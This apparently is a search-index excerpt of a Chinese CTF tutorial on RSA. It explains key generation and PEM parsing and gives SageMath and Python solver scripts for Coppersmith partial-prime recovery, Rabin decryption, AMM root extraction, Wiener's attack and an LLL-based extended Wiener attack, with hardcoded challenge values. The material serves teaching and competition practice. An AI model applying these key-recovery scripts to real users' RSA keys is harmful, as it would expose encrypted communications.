:d1:2b:63:9d:f7:59:a9:9c:9a:db:57:50:0b:bd: 63 :50:41:aa:70:f8:e7:3f:6e:a1:58:b2:3b:9a:f5: 75 :91:5c:f6:8c:f8:e5:7b:04:5b:be:bc:f7:8a:9b: ca:72:bf:0e:63:cb:6e:c3:53:d6:61:42:04:8c:b6: 9e:b5:f2:0c:dc:6b:af:6c:85:e7:7e:6f:2a:a9:06: dc:58:68:fc:b0:f0:33:0d:eb:55:07:6e:df:1b:22: 6e:f5:49:26:dd:2a:d3:c9:43:c8:eb:35:cb:8c:85: 84 :8e:05:ea:86:80:98:8a:18:27:01:b6:a0:dc:54: 96 :77:60:ca:c2:81:36:ad:5b:3d:9f:1c:f7:95:2b: 89 :8c:fa:af:86:3a:90:bf:d5:8d:f0:fa:3f:35:8a: 7e:b8:bc:be:1b:fc:f1:38:72:bb:b9:fc:c2:b3:30: a3:8f:3f:d6:89:46:7f:ef:22:f0:27:54:9f:53:d4: 60 :e9:fe:bb:48:f1:ae:15:f7:bf:ba:93:06:96:41: fd:53:c4:6f:c9:71:56:0f:59:55:d8:f6:e4:19:f5: 98 :1a:9b:a3:93:71:8d:78:5f:58:65:96:07:f5:11: f6:cc:40:77:83:4e:05:9f:36:8e:b0:5b:ca:79:64: ea:2d:c8:cd:1b:13:f6:2a:29:ea:24:4a:38:76:ff: 59 :67 publicExponent: 65537 ( 0x10001 ) privateExponent: 0 prime1: 0 prime2: 00 :ee:4e:18:98:45:cc:78:ef:ef:4a:c3:e8:1d:8a: ef:99:7f:73:5d:58:33:b5:c7:e8:49:4b:91:74:ae: 21 :1b:a8:82:31:e2:56:7e:e6:df:99:01:32:8e:0c: 6d:bc:5e:24:b3:43:77:47:85:ae:7e:88:ec:40:9c: a1:d7:29:01:e3:2a:58:2f:29:12:60:eb:98:51:fc: bb:0f:ff:20:80:5d:00:00:00:00:00:00:00:00:00: 00 :00:00:00:00:00:00:00:00:00:00:00:00:00:00: 00 :00:00:00:00:00:00:00:00:00:00:00:00:00:00: 00 :00:00:00:00:00:00:00:00 exponent1: 0 exponent2: 0 coefficient: 0 from sage.all import * n = 0xd12b639df759a99c9adb57500bbd635041aa70f8e73f6ea158b23b9af575915cf68cf8e57b045bbebcf78a9bca72bf0e63cb6ec353d66142048cb69eb5f20cdc6baf6c85e77e6f2aa906dc5868fcb0f0330deb55076edf1b226ef54926dd2ad3c943c8eb35cb8c85848e05ea8680988a182701b6a0dc54967760cac28136ad5b3d9f1cf7952b898cfaaf863a90bfd58df0fa3f358a7eb8bcbe1bfcf13872bbb9fcc2b330a38f3fd689467fef22f027549f53d460e9febb48f1ae15f7bfba93069641fd53c46fc971560f5955d8f6e419f5981a9ba393718d785f58659607f511f6cc4077834e059f368eb05bca7964ea2dc8cd1b13f62a29ea244a3876ff5967 p4 = 0xee4e189845cc78efef4ac3e81d8aef997f735d5833b5c7e8494b9174ae211ba88231e2567ee6df9901328e0c6dbc5e24b343774785ae7e88ec409ca1d72901e32a582f291260eb9851fcbb0fff20805d #\u5df2\u77e5P\u7684\u9ad8\u4f4d e = 0x10001 pbits = 1024 #P\u539f\u672c\u7684\u4f4d\u6570 kbits = pbits - p4 . nbits () print ( p4 . nbits ()) p4 = p4 << kbits PR .< x > = PolynomialRing ( Zmod ( n )) f = x + p4 roots = f . small_roots ( X = 2 ^ kbits , beta = 0.4 ) #\u7ecf\u8fc7\u4ee5\u4e0a\u4e00\u4e9b\u51fd\u6570\u5904\u7406\u540e\uff0cn\u548cp\u5df2\u7ecf\u88ab\u8f6c\u5316\u4e3a10\u8fdb\u5236 if roots : p = p4 + int ( roots [ 0 ]) print ( \"n: \" + str ( n )) print ( \"p: \" + str ( p )) print ( \"q: \" + str ( n // p )) \u6d88\u606f\u52a0\u5bc6 \u9996\u5148\u9700\u8981\u5c06\u6d88\u606f \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e $N$\uff0c\u4e14\u4e0e $N$ \u4e92\u8d28\u7684\u6574\u6570 $m$\u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a $$ m^{e}\\equiv c\\pmod N $$ \u6d88\u606f\u89e3\u5bc6 \u5229\u7528\u5bc6\u94a5 $d<200b>$ \u8fdb\u884c\u89e3\u5bc6\u3002 $$ c^{d}\\equiv m\\pmod N $$ gmpy gmpy2 pycrypto gmpy.root(a, b)`\uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 `(x, y)`\uff0c\u5176\u4e2d `x` \u4e3a `a` \u5f00 `b` \u6b21\u65b9\u7684\u503c\uff0c`y` \u662f\u5224\u65ad `x` \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf gmpy2.iroot(a, b)\uff0c\u7c7b\u4f3c\u4e8e gmpy.root(a,b) import gmpy2 as gp import binascii p = q = e = c = n = p * q phi = ( p - 1 ) * ( q - 1 ) d = gp . invert ( e , phi ) m = pow ( c , d , n ) print ( m ) print ( bytes . fromhex ( hex ( m )[ 2 :])) import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 msg = 'crypto here' p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) key = PKCS1_v1_5 . new ( privatekey ) msg = key . decrypt ( enc . decode ( 'base64' ), e ) \u4f8b\uff11\u3000Rabin \u7b97\u6cd5 Rabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e $e=2$\u3002 \u4e8c\u6b21\u5269\u4f59 \u5bc6\u6587\uff1a $$ c = m^2\\bmod n $$ \u5982\u679c p \u2261 q \u2261 3 ( mod 4 ) import gmpy2 # \u5982\u679c p \u2261 q \u2261 3 ( mod 4 ) def rabin_decrypt ( c , p , q , e = 2 ): n = p * q mp = pow ( c , ( p + 1 ) // 4 , p ) mq = pow ( c , ( q + 1 ) // 4 , q ) yp = gmpy2 . invert ( p , q ) yq = gmpy2 . invert ( q , p ) r = ( yp * p * mq + yq * q * mp ) % n rr = n - r s = ( yp * p * mq - yq * q * mp ) % n ss = n - s return ( r , rr , s , ss ) c = p = q = m = rabin_decrypt ( c , p , q ) for i in range ( 4 ): try : print ( bytes . fromhex ( hex ( m [ i ])[ 2 :])) except : pass \u5982\u679c p \u2261 1 or q \u2261 1 ( mod 4 ) AMM, \u5168\u79f0\u4e3aAdleman-Mander-Miller Method\u3002\u57281977\u5e74\u4ed6\u4eec\u53d1\u8868\u7684\u8bba\u6587\u91cc\u53ea\u6d89\u53ca\u4e86\u5f00\u5e73\u65b9\u6839\u7684\u65b9\u6cd5\uff0c\u5f00n\u6b21\u65b9\u6839\u5e76\u6ca1\u6709\u5f88\u8be6\u7ec6\u7684\u4ecb\u7ecd\u3002\u300a Adleman-Manders-Miller Root Extraction Method Revisited \u300b\u91cc\u4e09\u4f4d\u4e2d\u56fd\u4eba\u8865\u5145\u4e86\u4ed6\u4eec\u5f00n\u6b21\u65b9\u6839\u7684\u65b9\u6cd5\u3002 from Crypto.Util.number import long_to_bytes import random import time import gmpy2 # About 3 seconds to run def AMM ( o , r , q ): start = time . time () print ( ' \\n ----------------------------------------------------------------------------------' ) print ( 'Start to run Adleman-Manders-Miller Root Extraction Method' ) print ( 'Try to find one {:#x} th root of {} modulo {} ' . format ( r , o , q )) g = GF ( q ) o = g ( o ) p = g ( random . randint ( 1 , q )) while p ^ (( q - 1 ) // r ) == 1 : p = g ( random . randint ( 1 , q )) print ( '[+] Find p: {} ' . format ( p )) t = 0 s = q - 1 while s % r == 0 : t += 1 s = s // r print ( '[+] Find s: {} , t: {} ' . format ( s , t )) k = 1 while ( k * s + 1 ) % r != 0 : k += 1 alp = ( k * s + 1 ) // r print ( '[+] Find alp: {} ' . format ( alp )) a = p ^ ( r ^ ( t - 1 ) * s ) b = o ^ ( r * alp - 1 ) c = p ^ s h = 1 for i in range ( 1 , t ): d = b ^ ( r ^ ( t - 1 - i )) if d == 1 : j = 0 else : print ( '[+] Calculating DLP...' ) j = - discrete_log ( a , d ) print ( '[+] Finish DLP...' ) b = b * ( c ^ r ) ^ j h = h * c ^ j c = c ^ r result = o ^ alp * h end = time . time () print ( \"Finished in {} seconds.\" . format ( end - start )) print ( 'Find one solution: {} ' . format ( result )) return result def findAllPRoot ( p , e ): print ( \"Start to find all the Primitive {:#x} th root of 1 modulo {} .\" . format ( e , p )) start = time . time () proot = set () while len ( proot ) < e : proot . add ( pow ( random . randint ( 2 , p - 1 ), ( p - 1 ) // e , p )) end = time . time () print ( \"Finished in {} seconds.\" . format ( end - start )) return proot def findAllSolutions ( mp , proot , cp , p ): print ( \"Start to find all the {:#x} th root of {} modulo {} .\" . format ( e , cp , p )) start = time . time () all_mp = set () for root in proot : mp2 = mp * root % p assert ( pow ( mp2 , e , p ) == cp ) all_mp . add ( mp2 ) end = time . time () print ( \"Finished in {} seconds.\" . format ( end - start )) return all_mp c = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406 p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059 q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741 e = 4919 cp = c % p cq = c % q mp = AMM ( cp , e , p ) mq = AMM ( cq , e , q ) p_proot = findAllPRoot ( p , e ) q_proot = findAllPRoot ( q , e ) mps = findAllSolutions ( mp , p_proot , cp , p ) mqs = findAllSolutions ( mq , q_proot , cq , q ) def check ( m ): h = m . hex () if len ( h ) & 1 : return False tmp = long_to_bytes ( m ) if tmp . startswith ( b '*CTF' ): print ( tmp ) return True else : return False # About 16 mins to run 0x1337^2 == 24196561 times CRT start = time . time () print ( 'Start CRT...' ) for mpp in mps : for mqq in mqs : solution = CRT_list ([ int ( mpp ), int ( mqq )], [ p , q ]) if check ( solution ): print ( solution ) exit () print ( time . time () - start ) end = time . time () print ( \"Finished in {} seconds.\" . format ( end - start )) \u4f8b2 Wiener's Attack \u7ef4\u7eb3\u653b\u51fb \u5728 d \u6bd4\u8f83\u5c0f\uff08e\u5f88\u5927)\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528 Wiener's Attack \u6765\u83b7\u5f97\u79c1\u94a5\u3002 from Crypto.Util.number import long_to_bytes N = 13123058934861171416713230498081453101147538789122070079961388806126697916963123413431108069961369055630747412550900239402710827847917960870358653962948282381351741121884528399369764530446509936240262290248305226552117100584726616255292963971141510518678552679033220315246377746270515853987903184512948801397452104554589803725619076066339968999308910127885089547678968793196148780382182445270838659078189316664538631875879022325427220682805580410213245364855569367702919157881367085677283124732874621569379901272662162025780608669577546548333274766058755786449491277002349918598971841605936268030140638579388226573929 e = 2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877 c = 5050700824254369629706222317182304817854328502946762466640160034518936104331190872577165966740698992599993738318065255426640532388783701269523249466457133362594746792709049331755573439792147596921989197734488068944429765799441691036386928330707210973914074578898342882873616545592434522483589258331701541867114404243232706375190196458540529576587657819733333494394523717323185402624115436179872398952968236327891601604027452104042607034392903007131961865175671712730843855271756666933385216702709156167983750382459620742910616481648578102406179645040011072888784105210037974451473774905783067038311390636241835590091 for phi in [ phi [ 0 ] for k , d in [ f . as_integer_ratio () for f in ( e / N ) . continued_fraction () . convergents () ] #if k != 0 and (phi := divmod(e * d - 1, k))[1] == 0 if k != 0 and ( phi := divmod ( e * d - 1 , k )) ]: x = PolynomialRing ( RationalField (), \"x\" ) . gen () if len ( roots := ( x ** 2 - ( N - phi + 1 ) * x + N ) . roots ()) == 2 : print ( long_to_bytes ( pow ( c , inverse_mod ( e , ( roots [ 0 ][ 0 ] - 1 ) * ( roots [ 1 ][ 0 ] - 1 )), N ) ) ) \u6269\u5c55Wiener\u653b\u51fb Everything is Still Big N = 0x665166804cd78e8197073f65f58bca14e019982245fcc7cad74535e948a4e0258b2e919bf3720968a00e5240c5e1d6b8831d8fec300d969fccec6cce11dde826d3fbe0837194f2dc64194c78379440671563c6c75267f0286d779e6d91d3e9037c642a860a894d8c45b7ed564d341501cedf260d3019234f2964ccc6c56b6de8a4f66667e9672a03f6c29d95100cdf5cb363d66f2131823a953621680300ab3a2eb51c12999b6d4249dde499055584925399f3a8c7a4a5a21f095878e80bbc772f785d2cbf70a87c6b854eb566e1e1beb7d4ac6eb46023b3dc7fdf34529a40f5fc5797f9c15c54ed4cb018c072168e9c30ca3602e00ea4047d2e5686c6eb37b9 e = 0x2c998e57bc651fe4807443dbb3e794711ca22b473d7792a64b7a326538dc528a17c79c72e425bf29937e47b2d6f6330ee5c13bfd8564b50e49132d47befd0ee2e85f4bfe2c9452d62ef838d487c099b3d7c80f14e362b3d97ca4774f1e4e851d38a4a834b077ded3d40cd20ddc45d57581beaa7b4d299da9dec8a1f361c808637238fa368e07c7d08f5654c7b2f8a90d47857e9b9c0a81a46769f6307d5a4442707afb017959d9a681fa1dc8d97565e55f02df34b04a3d0a0bf98b7798d7084db4b3f6696fa139f83ada3dc70d0b4c57bf49f530dec938096071f9c4498fdef9641dfbfe516c985b27d1748cc6ce1a4beb1381fb165a3d14f61032e0f76f095d c = 0x503d5dd3bf3d76918b868c0789c81b4a384184ddadef81142eabdcb78656632e54c9cb22ac2c41178607aa41adebdf89cd24ec1876365994f54f2b8fc492636b59382eb5094c46b5818cf8d9b42aed7e8051d7ca1537202d20ef945876e94f502e048ad71c7ad89200341f8071dc73c2cc1c7688494cad0110fca4854ee6a1ba999005a650062a5d55063693e8b018b08c4591946a3fc961dae2ba0c046f0848fbe5206d56767aae8812d55ee9decc1587cf5905887846cd3ecc6fc069e40d36b29ee48229c0c79eceab9a95b11d15421b8585a2576a63b9f09c56a4ca1729680410da237ac5b05850604e2af1f4ede9cf3928cbb3193a159e64482928b585ac s = floor ( sqrt ( N )) M = Matrix ([[ e , s ], [ N , 0 ]]) Mred = M . LLL () D = [ abs ( Mred [ i , 1 ]) // s for i in [ 0 , 1 ]] for d in D : t = randint ( 2 , N - 2 ) tt = pow ( t , e , N ) if tt ^ d != t : continue flag = int ( pow ( c , d , N )) flag = flag . to_bytes (( flag . bit_length () + 7 ) // 8 , 'big' ) print ( f 'FLAG: { flag . decode () } ' )","title":"CTF\u5e38\u7528RSA\u6280\u5de7"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#rsa","text":"RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5728\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u548c\u7535\u5b50\u5546\u4e1a\u4e2d RSA \u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002RSA \u662f 1977 \u5e74\u7531\u7f57\u7eb3\u5fb7\u00b7\u674e\u7ef4\u65af\u7279\uff08Ron Rivest\uff09\u3001\u963f\u8fea\u00b7\u8428\u83ab\u5c14\uff08Adi Shamir\uff09\u548c\u4f26\u7eb3\u5fb7\u00b7\u963f\u5fb7\u66fc\uff08Leonard Adleman\uff09\u4e00\u8d77\u63d0\u51fa\u7684\u3002RSA \u5c31\u662f \u4ed6\u4eec\u4e09\u4eba\u59d3\u6c0f\u5f00\u5934\u5b57\u6bcd\u62fc\u5728\u4e00\u8d77\u7ec4\u6210\u7684\u3002 RSA \u7b97\u6cd5\u7684\u53ef\u9760\u6027\u7531\u6781\u5927\u6574\u6570\u56e0\u6570\u5206\u89e3\u7684\u96be\u5ea6\u51b3\u5b9a\u3002\u6362\u8a00\u4e4b\uff0c\u5bf9\u4e00\u6781\u5927\u6574\u6570\u505a\u56e0\u6570\u5206\u89e3\u6108\u56f0\u96be\uff0cRSA \u7b97\u6cd5\u6108\u53ef\u9760\u3002\u5047\u5982\u6709\u4eba\u627e\u5230\u4e00\u79cd\u5feb\u901f\u56e0\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u7684\u8bdd\uff0c\u90a3\u4e48\u7528 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u7684\u53ef\u9760\u6027\u5c31\u80af\u5b9a\u4f1a\u6781\u5ea6\u4e0b\u964d\u3002\u4f46\u627e\u5230\u8fd9\u6837\u7684\u7b97\u6cd5 \u7684\u53ef\u80fd\u6027\u662f\u975e\u5e38\u5c0f\u7684\u3002\u5982\u4eca\uff0c\u53ea\u6709\u77ed\u7684 RSA \u5bc6\u94a5\u624d\u53ef\u80fd\u88ab\u5f3a\u529b\u65b9\u5f0f\u89e3\u7834\u3002\u5230 2017 \u5e74\u4e3a\u6b62\uff0c\u8fd8\u6ca1\u6709\u4efb\u4f55\u53ef\u9760\u7684\u653b\u51fb RSA \u7b97\u6cd5\u7684\u65b9\u5f0f\u3002","title":"RSA \u4ecb\u7ecd"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#_1","text":"","title":"\u57fa\u672c\u539f\u7406"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#_2","text":"\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570 $p$ \u548c $q$\uff0c\u8ba1\u7b97 $N = p \\times q$ \u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97 $\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)$ \u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e $\\varphi (N)$ \u7684\u6574\u6570 $e$\uff0c\u4f7f $e$ \u548c $\\varphi (N)$ \u4e92\u8d28\u3002\u5e76\u6c42\u5f97 $e$ \u5173\u4e8e $\\varphi (N)$ \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a $d$\uff0c\u6709 $ed\\equiv 1 \\pmod {\\varphi (N)}$ \u5c06 $p<200b>$ \u548c $q<200b>$ \u7684\u8bb0\u5f55\u9500\u6bc1 \u6b64\u65f6\uff0c$(N,e)$ \u662f\u516c\u94a5\uff0c$(N,d)$ \u662f\u79c1\u94a5\u3002","title":"\u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#_3","text":"from Crypto.PublicKey import RSA pk = b '''-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0StjnfdZqZya21dQC71j UEGqcPjnP26hWLI7mvV1kVz2jPjlewRbvrz3ipvKcr8OY8tuw1PWYUIEjLaetfIM 3GuvbIXnfm8qqQbcWGj8sPAzDetVB27fGyJu9Ukm3SrTyUPI6zXLjIWEjgXqhoCY ihgnAbag3FSWd2DKwoE2rVs9nxz3lSuJjPqvhjqQv9WN8Po/NYp+uLy+G/zxOHK7 ufzCszCjjz/WiUZ/7yLwJ1SfU9Rg6f67SPGuFfe/upMGlkH9U8RvyXFWD1lV2Pbk GfWYGpujk3GNeF9YZZYH9RH2zEB3g04FnzaOsFvKeWTqLcjNGxP2KinqJEo4dv9Z ZwIDAQAB -----END PUBLIC KEY-----''' keyPub = RSA . importKey ( pk ) >>> keyPub RsaKey ( n = 26405201714915839490865227813246218372938736243516916108608439705738170543023112509150522274284238701776297205717958250714972924576706985074311737321016048409831557758205687745692399643151467933196930799657476449865271038382866908177517793954543176769652784274788769353482450910551831498252972857285424471782215525406445071432588374802623485148684255853068532820859835479998199886719945699488858505070686919320144576280217196858823521754407597888769668827432569034617434944912323704501156532854074083408527717809315663187405585840074689387865750105223058720511199252150772925124516509254841404742306560035497627834727 , e = 65537 ) $ openssl rsa -inform PEM -pubin -in pubkey.pem -text -noout RSA Public-Key: ( 2048 bit ) Modulus: 00 :d1:2b:63:9d:f7:59:a9:9c:9a:db:57:50:0b:bd: 63 :50:41:aa:70:f8:e7:3f:6e:a1:58:b2:3b:9a:f5: 75 :91:5c:f6:8c:f8:e5:7b:04:5b:be:bc:f7:8a:9b: ca:72:bf:0e:63:cb:6e:c3:53:d6:61:42:04:8c:b6: 9e:b5:f2:0c:dc:6b:af:6c:85:e7:7e:6f:2a:a9:06: dc:58:68:fc:b0:f0:33:0d:eb:55:07:6e:df:1b:22: 6e:f5:49:26:dd:2a:d3:c9:43:c8:eb:35:cb:8c:85: 84 :8e:05:ea:86:80:98:8a:18:27:01:b6:a0:dc:54: 96 :77:60:ca:c2:81:36:ad:5b:3d:9f:1c:f7:95:2b: 89 :8c:fa:af:86:3a:90:bf:d5:8d:f0:fa:3f:35:8a: 7e:b8:bc:be:1b:fc:f1:38:72:bb:b9:fc:c2:b3:30: a3:8f:3f:d6:89:46:7f:ef:22:f0:27:54:9f:53:d4: 60 :e9:fe:bb:48:f1:ae:15:f7:bf:ba:93:06:96:41: fd:53:c4:6f:c9:71:56:0f:59:55:d8:f6:e4:19:f5: 98 :1a:9b:a3:93:71:8d:78:5f:58:65:96:07:f5:11: f6:cc:40:77:83:4e:05:9f:36:8e:b0:5b:ca:79:64: ea:2d:c8:cd:1b:13:f6:2a:29:ea:24:4a:38:76:ff: 59 :67 Exponent: 65537 ( 0x10001 ) $ openssl rsa -inform PEM -in privatekey.pem -text -noout RSA Private-Key: ( 2048 bit, 2 primes ) modulus: 00 :d1:2b:63:9d:f7:59:a9:9c:9a:db:57:50:0b:bd: 63 :50:41:aa:70:f8:e7:3f:6e:a1:58:b2:3b:9a:f5: 75 :91:5c:f6:8c:f8:e5:7b:04:5b:be:bc:f7:8a:9b: ca:72:bf:0e:63:cb:6e:c3:53:d6:61:42:04:8c:b6: 9e:b5:f2:0c:dc:6b:af:6c:85:e7:7e:6f:2a:a9:06: dc:58:68:fc:b0:f0:33:0d:eb:55:07:6e:df:1b:22: 6e:f5:49:26:dd:2a:d3:c9:43:c8:eb:35:cb:8c:85: 84 :8e:05:ea:86:80:98:8a:18:27:01:b6:a0:dc:54: 96 :77:60:ca:c2:81:36:ad:5b:3d:9f:1c:f7:95:2b: 89 :8c:fa:af:86:3a:90:bf:d5:8d:f0:fa:3f:35:8a: 7e:b8:bc:be:1b:fc:f1:38:72:bb:b9:fc:c2:b3:30: a3:8f:3f:d6:89:46:7f:ef:22:f0:27:54:9f:53:d4: 60 :e9:fe:bb:48:f1:ae:15:f7:bf:ba:93:06:96:41: fd:53:c4:6f:c9:71:56:0f:59:55:d8:f6:e4:19:f5: 98 :1a:9b:a3:93:71:8d:78:5f:58:65:96:07:f5:11: f6:cc:40:77:83:4e:05:9f:36:8e:b0:5b:ca:79:64: ea:2d:c8:cd:1b:13:f6:2a:29:ea:24:4a:38:76:ff: 59 :67 publicExponent: 65537 ( 0x10001 ) privateExponent: 0 prime1: 0 prime2: 00 :ee:4e:18:98:45:cc:78:ef:ef:4a:c3:e8:1d:8a: ef:99:7f:73:5d:58:33:b5:c7:e8:49:4b:91:74:ae: 21 :1b:a8:82:31:e2:56:7e:e6:df:99:01:32:8e:0c: 6d:bc:5e:24:b3:43:77:47:85:ae:7e:88:ec:40:9c: a1:d7:29:01:e3:2a:58:2f:29:12:60:eb:98:51:fc: bb:0f:ff:20:80:5d:00:00:00:00:00:00:00:00:00: 00 :00:00:00:00:00:00:00:00:00:00:00:00:00:00: 00 :00:00:00:00:00:00:00:00:00:00:00:00:00:00: 00 :00:00:00:00:00:00:00:00 exponent1: 0 exponent2: 0 coefficient: 0 from sage.all import * n = 0xd12b639df759a99c9adb57500bbd635041aa70f8e73f6ea158b23b9af575915cf68cf8e57b045bbebcf78a9bca72bf0e63cb6ec353d66142048cb69eb5f20cdc6baf6c85e77e6f2aa906dc5868fcb0f0330deb55076edf1b226ef54926dd2ad3c943c8eb35cb8c85848e05ea8680988a182701b6a0dc54967760cac28136ad5b3d9f1cf7952b898cfaaf863a90bfd58df0fa3f358a7eb8bcbe1bfcf13872bbb9fcc2b330a38f3fd689467fef22f027549f53d460e9febb48f1ae15f7bfba93069641fd53c46fc971560f5955d8f6e419f5981a9ba393718d785f58659607f511f6cc4077834e059f368eb05bca7964ea2dc8cd1b13f62a29ea244a3876ff5967 p4 = 0xee4e189845cc78efef4ac3e81d8aef997f735d5833b5c7e8494b9174ae211ba88231e2567ee6df9901328e0c6dbc5e24b343774785ae7e88ec409ca1d72901e32a582f291260eb9851fcbb0fff20805d #\u5df2\u77e5P\u7684\u9ad8\u4f4d e = 0x10001 pbits = 1024 #P\u539f\u672c\u7684\u4f4d\u6570 kbits = pbits - p4 . nbits () print ( p4 . nbits ()) p4 = p4 << kbits PR .< x > = PolynomialRing ( Zmod ( n )) f = x + p4 roots = f . small_roots ( X = 2 ^ kbits , beta = 0.4 ) #\u7ecf\u8fc7\u4ee5\u4e0a\u4e00\u4e9b\u51fd\u6570\u5904\u7406\u540e\uff0cn\u548cp\u5df2\u7ecf\u88ab\u8f6c\u5316\u4e3a10\u8fdb\u5236 if roots : p = p4 + int ( roots [ 0 ]) print ( \"n: \" + str ( n )) print ( \"p: \" + str ( p )) print ( \"q: \" + str ( n // p ))","title":"\u516c\u94a5/\u79c1\u94a5\u6587\u4ef6\u8bfb\u53d6"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#_4","text":"\u9996\u5148\u9700\u8981\u5c06\u6d88\u606f \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e $N$\uff0c\u4e14\u4e0e $N$ \u4e92\u8d28\u7684\u6574\u6570 $m$\u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a $$ m^{e}\\equiv c\\pmod N $$","title":"\u6d88\u606f\u52a0\u5bc6"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#_5","text":"\u5229\u7528\u5bc6\u94a5 $d<200b>$ \u8fdb\u884c\u89e3\u5bc6\u3002 $$ c^{d}\\equiv m\\pmod N $$","title":"\u6d88\u606f\u89e3\u5bc6"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#gmpy-gmpy2-pycrypto","text":"gmpy.root(a, b)`\uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 `(x, y)`\uff0c\u5176\u4e2d `x` \u4e3a `a` \u5f00 `b` \u6b21\u65b9\u7684\u503c\uff0c`y` \u662f\u5224\u65ad `x` \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf gmpy2.iroot(a, b)\uff0c\u7c7b\u4f3c\u4e8e gmpy.root(a,b) import gmpy2 as gp import binascii p = q = e = c = n = p * q phi = ( p - 1 ) * ( q - 1 ) d = gp . invert ( e , phi ) m = pow ( c , d , n ) print ( m ) print ( bytes . fromhex ( hex ( m )[ 2 :])) import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 msg = 'crypto here' p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) key = PKCS1_v1_5 . new ( privatekey ) msg = key . decrypt ( enc . decode ( 'base64' ), e )","title":"gmpy gmpy2 pycrypto"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#1-rabin","text":"Rabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e $e=2$\u3002 \u4e8c\u6b21\u5269\u4f59 